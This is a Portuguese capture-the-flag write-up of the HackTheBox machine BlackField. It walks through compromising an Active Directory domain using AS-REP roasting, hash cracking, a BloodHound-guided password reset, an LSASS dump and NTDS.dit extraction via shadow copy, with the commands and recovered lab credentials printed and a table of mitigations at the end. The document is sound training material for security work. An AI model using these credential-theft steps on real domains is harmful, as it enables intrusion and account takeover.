# Write-up — BlackField (HackTheBox)

**Contexto/Box:** BlackField  
**Dificuldade:** Hard/Difícil  

---

## Enumeração

**Caminhos tentados e descartados:**  
- Scan inicial com `nmap` revelou portas típicas de AD (53, 88, 389, 445, 5985).  
- Tentativa de acesso SMB como convidado funcionou apenas parcialmente, listando `profiles$`.  
- Outras portas como HTTP/HTTPS não estavam disponíveis, descartando vetores baseados em Web.

**Abordagem confirmada:**  
- Enumeração SMB → coleta de nomes de usuários → ataques Kerberos.

Comandos utilizados:
```bash
nmap -p- --min-rate 10000 target_ip -oA scans/nmap-alltcp
nmap -p 53,88,389,445,5985 -sC -sV -T4 target_ip -oN scan.txt
```

---

## Exploração

**Passos objetivos:**  
- Identificamos contas com Kerberos pre-auth desabilitado → AS-REP Roasting.  
- Extraímos hash via `GetNPUsers.py` e quebramos com `john`.  

```bash
GetNPUsers.py -no-pass -dc-IP target_ip DOMAIN/user
john hash.txt --wordlist=rockyou.txt
```
Credenciais obtidas:  
`support : #00^BlackKnight`

**Alternativas consideradas:**  
- Kerberoasting → descartado inicialmente por falta de SPNs expostos.  
- Exploração de SMB via null session → sem sucesso.

---

## Pós-Exploração

**Movimento lateral:**  
- Com BloodHound, identificamos que `support` podia resetar senha de `audit2020`.  
- Alteramos a senha via RPC e acessamos compartilhamentos SMB.

```bash
bloodhound-python -c All -u support -p '#00^BlackKnight' -d domain.local -dc dc01
rpcclient -U support -I target_ip
smbclient //target_ip/forensic -U audit2020%TryH@arder!
```

**Loot e privesc:**  
- Encontramos dump do LSASS → extraímos hashes com `pypykatz`.  
- Conta `svc_backup` tinha privilégio de Backup Operators → criamos shadow copy e extraímos `NTDS.dit`.

```bash
diskshadow /s vss.dsh
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

Obtemos hash do administrador e domínio totalmente comprometido.

---

## Mitigações

| Vetor                         | Correção Realista                                              |
|------------------------------|---------------------------------------------------------------|
| AS-REP Roasting             | Habilitar Kerberos pre-auth para todos os usuários.          |
| Privilégios excessivos       | Restringir ACLs que permitem reset de senhas via RPC.       |
| Dump LSASS / Backup Ops      | Habilitar LSA Protection e Credential Guard.                |
| Shadow Copy abuse            | Monitorar/Restringir criação de VSS por contas administrativas.|
| Enumeração SMB               | Restringir acesso anônimo e reforçar políticas de compartilhamento.|
| Auditoria                    | Habilitar Sysmon, logs PowerShell e alertas de criação de cópias de sombra.|

---

**Resumo:** Cenário envolveu enumeração avançada, AS-REP Roasting, abuso de ACLs e extração offline do NTDS. Medidas preventivas robustas são críticas para mitigar riscos.

---
